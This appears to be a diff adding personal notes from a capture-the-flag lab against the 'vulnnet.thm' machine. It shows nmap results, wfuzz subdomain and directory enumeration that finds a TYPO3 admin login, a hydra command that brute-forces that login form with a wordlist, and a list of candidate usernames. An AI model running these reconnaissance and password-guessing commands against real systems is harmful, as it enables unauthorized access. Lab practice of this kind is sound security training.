@@ -1,0 +1,65 @@
+Vulnet-Endgame 22 Sept 2022
+======================================
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
+|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
+|_  256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (EdDSA)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+MAC Address: 02:37:51:C4:4D:43 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+root@ip-10-10-92-46:~# wfuzz -H "Host: FUZZ.vulnnet.thm" --hc 404 --hh 65 -H "User-Agent: PENTEST" -c -z file,Tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  -u http://vulnnet.thm
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.2.9 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://vulnnet.thm/
+Total requests: 114532
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000018:  C=200    390 L	    1599 W	  19316 Ch	  "blog"
+000037:  C=200    524 L	    1406 W	  26701 Ch	  "shop"
+000051:  C=200      0 L	       4 W	     18 Ch	  "api"
+001221:  C=307      0 L	       0 W	      0 Ch	  "admin1"
+
+044531:  C=200    524 L	    1406 W	  26701 Ch	  "Shop"
+
+
+Target: http://admin1.vulnnet.thm/FUZZ
+Total requests: 220546
+
+==================================================================
+ID	Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000052:  C=301      9 L	      28 W	    321 Ch	  "en"
+001469:  C=301      9 L	      28 W	    328 Ch	  "fileadmin"
+001467:  C=301      9 L	      28 W	    325 Ch	  "vendor"
+002531:  C=301      9 L	      28 W	    328 Ch	  "typo3temp"
+020399:  C=301      9 L	      28 W	    324 Ch	  "typo3"       **************CMS login page *********
+035183:  C=301      9 L	      28 W	    328 Ch	  "typo3conf"
+
+hydra -L vulnnet/users.txt -P Tools/wordlists/fasttrack.txt admin1.vulnnet.thm http-post-form "/typo3/?loginProvider=1433416747:login_status=login&userident=^USER^&redirect_url=&loginRefresh=&interface=backend&username=^USER^&p_field=^PASS^&commandLI=:Your login attempt did not succeed"
+
+users.txt
+skywaves
+sal
+steve
+mary
+jane
+root
+admin
+administrator
